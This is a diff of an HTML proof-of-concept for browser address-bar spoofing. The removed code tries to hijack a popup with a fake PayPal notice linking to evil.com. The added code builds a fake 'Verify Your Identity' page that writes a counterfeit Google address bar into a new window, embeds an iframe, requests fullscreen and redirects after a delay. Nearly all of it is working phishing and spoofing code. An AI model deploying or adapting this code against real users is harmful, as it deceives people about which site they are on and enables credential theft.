@@ -1,25 +1,102 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>iOS Working Spoof PoC</title>
-  <script>
-    function handleClick(e) {
-      // Open legit site IMMEDIATELY inside user gesture
-      var t = window.open('https://legitsite.com', 'ss');
-
-      // Now try to hijack after a delay
-      setTimeout(() => {
-        try {
-          t.document.write(`<h1>Paypal has been moved</h1><a href="https://evil.com">Click here</a>`);
-          t.stop();
-        } catch (err) {
-          alert("Cannot hijack due to cross-origin restriction or popup block.");
-        }
-      }, 1500); // Adjust timing based on speed
+  <title>Verifying...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background: #f9f9f9;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
     }
-  </script>
+    #start {
+      font-size: 22px;
+      padding: 14px 28px;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+    }
+  </style>
 </head>
 <body>
-  <a href="#" onclick="handleClick(event)">click me2</a>
+  <h2>🔐 Please Verify Your Identity</h2>
+  <p>Tap the button below to proceed</p>
+  <button id="start">Continue</button>
+
+  <script>
+    document.getElementById('start').onclick = function () {
+      const win = window.open('about:blank', '_blank');
+
+      if (!win) return alert("Popup blocked");
+
+      const spoofHTML = `
+        <html>
+        <head>
+          <title>Account Verification</title>
+          <style>
+            body {
+              margin: 0;
+              font-family: sans-serif;
+              background: white;
+              overflow: hidden;
+            }
+            #fakebar {
+              background: #f1f3f4;
+              color: #202124;
+              padding: 12px;
+              font-size: 16px;
+              font-family: monospace;
+              border-bottom: 1px solid #ccc;
+            }
+            #main {
+              display: flex;
+              flex-direction: column;
+              align-items: center;
+              padding-top: 40px;
+            }
+            iframe {
+              width: 90vw;
+              height: 50vh;
+              border: 1px solid #ccc;
+              margin-top: 20px;
+            }
+            button {
+              margin-top: 30px;
+              font-size: 18px;
+              padding: 12px 24px;
+              background: #34a853;
+              color: white;
+              border: none;
+              border-radius: 6px;
+            }
+          </style>
+        </head>
+        <body>
+          <div id="fakebar">🔒 https://accounts.google.com</div>
+          <div id="main">
+            <h2>Enable Access</h2>
+            <p>This step is required for identity check</p>
+            <iframe src="https://permission.site"></iframe>
+            <button onclick="document.documentElement.requestFullscreen()">Start Fullscreen</button>
+          </div>
+          <script>
+            setTimeout(() => {
+              location.href = "https://google.com:8000";
+            }, 12000);
+          </script>
+        </body>
+        </html>
+      `;
+
+      win.document.write(spoofHTML);
+      win.document.close();
+    };
+  </script>
 </body>
 </html>
